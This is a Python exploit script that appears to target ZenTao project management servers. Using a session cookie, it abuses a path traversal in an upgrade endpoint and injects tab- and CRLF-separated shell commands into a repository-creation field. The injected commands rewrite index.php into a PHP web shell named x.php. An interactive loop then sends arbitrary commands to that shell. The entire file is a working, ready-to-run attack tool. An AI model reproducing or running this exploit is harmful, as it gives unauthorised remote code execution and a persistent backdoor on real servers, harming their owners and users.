import requests
import re
import sys
import urllib3
import argparse
from colorama import Fore, init

urllib3.disable_warnings()
init()


parser = argparse.ArgumentParser()
parser.add_argument('-t', type=str, help="Target url.", default="")
parser.add_argument('-c', type=str, help="Cookie.", default="")
parser.add_argument('-a', type=bool, help="Execute command mode.", default=False)
args = parser.parse_args()


def gen_header(target, cookie):
    headers = {
        'Cookie': cookie,
        'Origin': f'{target}',
        'Referer': f'{target}/user-login-L3plbnRhby8=.html'
    }
    return headers


def check_params():
    if args.t != "":
        if args.c != "":
            return True
        else:
            print(Fore.RED + '[-] Cookie cannot be empty!')
            sys.exit()
    else:
        print(Fore.RED + '[-] Target cannot be empty!')
        sys.exit()



def getStatusFileName(target, cookie):
    print(Fore.WHITE + "[+] Try to get status file name......")
    api_url = f'{target}/repo-create-1?HTTP_X_REQUESTED_WITH=XMLHttpRequest'
    headers = gen_header(target=target, cookie=cookie)
    data = {
        'SCM': 'Gitea',
        'client': 'test',
        'name': 'test',
        'encoding': 'test',
        'product': 'test',
        'encrypt': 'base64',
        'password': 'dGVzdAo=',
        'serviceProject': 'test'
    }
    response = requests.post(url=api_url, headers=headers, verify=False, data=data)
    try:
        r = re.search(r"(version_[0-9a-z]+.log)", response.text)
        filename = r.group(1)
        print(Fore.GREEN + "[*] Get status file name successed: {filename}".format(filename=filename))
        return filename
    except:
        print(Fore.RED + "[-] Get status file name failed.")
        sys.exit()


def createStatusFile(target, cookie, filename):
    print(Fore.WHITE + f"[+] Try to create {filename}......")
    api_url = f'{target}/upgrade-moveExtFiles-1'
    headers = gen_header(target=target, cookie=cookie)
    data = {
        'files[0]': f'../../tmp/log/{filename}/test'
    }
    requests.post(url=api_url, headers=headers, verify=False, data=data)
    print(Fore.GREEN + "[*] Create status file finished.")


def useLimitExecWriteShell(target, cookie):
    print(Fore.WHITE + "[+] Try to write shell......")
    api_url = f'{target}/repo-create-1'
    headers = gen_header(target=target, cookie=cookie)
    data = {
        'SCM': 'Subversion',
        'name': 'test',
        'encoding': 'test',
        'product': 'test',
        'encrypt': 'base64',
        'password': 'dGVzdAo=',
        'serviceProject': 'test',
        'client': "cp\t../../../htdocs/index.php\t../../www/y.php\t--context=\r\nsed\t-i\t's/isset/system/g'\t../../www/y.php\t--in-place=\r\nmv\t../../www/x.php\t../../www/x.php.bak\t--suffix=\r\nmv\t../../www/y.php\t../../www/x.php\t--suffix=\r\n",
    }
    requests.post(url=api_url, headers=headers, verify=False, data=data)


def execShell(target, cmd):
    response = requests.get(f"{target}/x.php?mode={cmd}")
    commandreslines = []
    for line in response.text.split('\n'):
        if line.startswith('<html xmlns='):
            break
        commandreslines.append(line)
    if len(commandreslines) % 8 == 0:
        commandreslines = commandreslines[0:len(commandreslines) // 8]
    return '\n'.join(commandreslines)


def checkShellExists(target):
    res = execShell(target=target, cmd='echo e10adc3949ba59abbe56e057f20f883e')
    if 'e10adc3949ba59abbe56e057f20f883e' in res:
        return True
    else:
        return False


def run():
    target = str(args.t).rstrip('/')
    if check_params():
        if args.a:
            while True:
                cmd = input(Fore.WHITE + f'{target}@shell:# ')
                if cmd in ['q', 'Q', 'quit', 'Quit', 'exit']:
                    print(Fore.RED + f'[-] Bye!')
                    sys.exit()
                else:
                    print(Fore.WHITE + f'{execShell(target=target, cmd=cmd)}')
        else:
            if not checkShellExists(target=target):
                status_filename = getStatusFileName(target=target, cookie=args.c)
                createStatusFile(target=target, cookie=args.c, filename=status_filename)
                useLimitExecWriteShell(target=target, cookie=args.c)
                if checkShellExists(target=target):
                    print(Fore.GREEN + '[*] Shell write successful.')
                    print(Fore.GREEN + f'[*] Shell address: {target}/x.php?mode=whoami.')
                    choice = input(Fore.WHITE + 'Whether to enter command line mode?y/n')
                    if choice in ['y', 'Y', 'yes', 'Yes', 'YES']:
                        while True:
                            cmd = input(Fore.WHITE + f'{target}@shell:# ')
                            if cmd in ['q', 'Q', 'quit', 'Quit', 'exit']:
                                print(Fore.RED + f'[-] Bye!')
                                sys.exit()
                            else:
                                print(Fore.WHITE + f'{execShell(target=target, cmd=cmd)}')
                    else:
                        sys.exit()
                else:
                    print(Fore.RED + '[*] Shell write failed.')
            else:
                print(Fore.GREEN + '[*] Shell already exists.')
                print(Fore.GREEN + f'[*] Shell address: {target}/x.php?mode=whoami.')


if __name__ == "__main__":
    run()
